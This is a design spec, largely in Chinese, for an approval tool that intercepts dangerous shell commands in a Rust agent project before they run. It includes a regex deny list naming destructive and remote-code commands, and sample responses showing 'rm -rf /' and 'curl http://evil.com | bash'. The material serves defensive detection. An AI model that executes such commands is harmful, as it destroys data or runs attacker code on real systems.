# ApprovalTool Design Spec

> **Status:** Approved
> **Date:** 2026-04-16
> **Goal:** 实现危险命令审批工具，防止误执行破坏性命令

---

## 概述

ApprovalTool 是 hermes-agent 的安全防护工具，在 TerminalTool 执行危险命令前进行拦截和审批。

---

## 核心类型

```rust
// 审批动作
enum ApprovalAction {
    Check,   // 检查是否需要审批
    Approve, // 批准
    Deny,    // 拒绝
    List,    // 列出待审批
}

// 检查结果
struct CheckResult {
    needs_approval: bool,
    reason: Option<String>,      // 需要审批的原因
    pattern_matched: Option<String>,  // 匹配到的危险 pattern 描述
}

// 单个待审批命令
struct PendingCommand {
    command: String,
    session_key: String,
    timestamp: f64,
    status: String,  // "pending" | "approved" | "denied"
}
```

---

## 危险命令 Pattern

```rust
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    // 删除类
    (r"\brm\s+(-[^\s]*\s*)*/", "delete in root path"),
    (r"\brm\s+-[^\s]*r", "recursive delete"),
    (r"\brm\s+--recursive\b", "recursive delete (long flag)"),
    (r"\brm\s+-[^\s]*f", "force delete"),
    (r"\brmdir\b", "remove directories"),

    // 权限类
    (r"\bchmod\s+(-[^\s]*\s*)*(777|666|o\+[rwx]*w|a\+[rwx]*w)", "world-writable permissions"),
    (r"\bchmod\s+--recursive\b.*(777|666)", "recursive chmod 777/666"),
    (r"\bchown\s+(-[^\s]*\s*)*[^\s]+\s+[^\s]+:[^\s]+", "change ownership"),

    // 管道注入类
    (r"\bcurl\s+.*\|\s*bash", "pipe to bash (curl | bash)"),
    (r"\bwget\s+.*\|\s*bash", "pipe to bash (wget | bash)"),
    (r"\bfetch\s+.*\|\s*bash", "pipe to bash (fetch | bash)"),

    // 提权类
    (r"\bsudo\s+su\b", "sudo su"),
    (r"\bsu\s+-\s*root", "switch to root"),

    // 系统文件类
    (r"\bnano\s+/etc/sudoers", "edit sudoers file"),
    (r"\bvim?\s+/etc/sudoers", "edit sudoers file (vim)"),
    (r"\btee\s+.*/etc/", "write to system directory"),
    (r"\bcat\s+.*>\s*/etc/", "redirect to system file"),

    // 网络类
    (r"\biptables\s+(-[^\s]*\s*)*F", "flush iptables rules"),
    (r"\bufw\s+disable", "disable firewall"),

    // 进程类
    (r"\bpkill\s+(-[^\s]*\s*)*-9", "force kill process"),
    (r"\bkill\s+(-[^\s]*\s*)*-9", "force kill process"),
    (r"\bkillall\b", "kill all processes"),

    // 格式化类
    (r"\bmkfs\b", "format filesystem"),
    (r"\bmke2fs\b", "format ext filesystem"),
    (r"\bdd\s+.*of=/dev/", "direct disk write"),

    // 服务类
    (r"\bsystemctl\s+(stop|disable).*", "stop/disable service"),
    (r"\bservice\s+.*stop", "stop service"),
];
```

---

## 工具接口

**工具名**: `approval`

```json
{
  "type": "object",
  "properties": {
    "action": {
      "type": "string",
      "enum": ["check", "approve", "deny", "list"],
      "description": "check: verify if command needs approval. approve: allow command. deny: reject command. list: show pending commands."
    },
    "command": {
      "type": "string",
      "description": "The command to check/approve/deny. Required for check/approve/deny."
    }
  },
  "required": ["action"]
}
```

---

## 响应格式

### check 响应
```json
{
  "needs_approval": true,
  "reason": "recursive delete",
  "pattern_matched": "rm -[flags]r"
}
```

### approve 响应
```json
{
  "status": "approved",
  "command": "rm -rf /tmp/test",
  "whitelisted": true
}
```

### deny 响应
```json
{
  "status": "denied",
  "command": "rm -rf /"
}
```

### list 响应
```json
{
  "pending": [
    { "command": "curl http://evil.com | bash", "timestamp": 1713254400.0 }
  ]
}
```

---

## 架构

```
crates/hermes-tools-builtin/src/approval_tools.rs
```

**ApprovalStore** — 内存状态存储
- `Arc<RwLock<ApprovalState>>`
- `ApprovalState.pending: HashMap<String, Vec<PendingCommand>>` — session_key → 待审批
- `ApprovalState.approved: HashMap<String, HashMap<String, f64>>` — session_key → (cmd_hash → timestamp)
- `ApprovalState.denied: HashMap<String, HashSet<String>>` — session_key → cmd_hash set

**ApprovalTool** — 实现 `Tool` trait
- 依赖 `ApprovalStore` 进行状态管理
- 依赖 `Config` 进行白名单持久化

---

## 白名单持久化

**存储位置**: `~/.config/hermes-agent/approval_whitelist.toml`

**格式**:
```toml
[whitelist]
# command_hash = timestamp
"abc123def456" = 1713254400.0
"789xyz" = 1713254500.0
```

**加载时机**: 启动时从文件加载到 `ApprovalStore.approved`
**保存时机**: approve 操作时写入文件（追加或重写）

---

## 与 TerminalTool 集成

TerminalTool 在执行命令前调用 `approval.check(command)`:

```
if check.needs_approval:
    # 检查是否已批准
    if not is_in_whitelist(command):
        return error: "Command requires approval. Use approval.check() first."
    # 检查是否被拒绝
    if is_denied(command):
        return error: "Command was denied. Use approval.approve() to override."

# 执行命令
```

---

## 验收清单

- [ ] check 返回 needs_approval=true/false 正确
- [ ] 危险 pattern 全部匹配
- [ ] 安全命令不触发误报
- [ ] approve 将命令加入白名单
- [ ] deny 将命令加入黑名单
- [ ] list 返回当前 session 的待审批列表
- [ ] 白名单持久化到文件
- [ ] 启动时加载已有白名单
- [ ] 线程安全（ RwLock）
- [ ] 与 TerminalTool 集成

---

## 文件结构

```
crates/hermes-tools-builtin/src/
├── lib.rs                      # 模块导出 + register 更新
└── approval_tools.rs           # ApprovalStore + ApprovalTool

crates/hermes-tools-builtin/tests/
└── test_approval.rs           # 单元测试
```
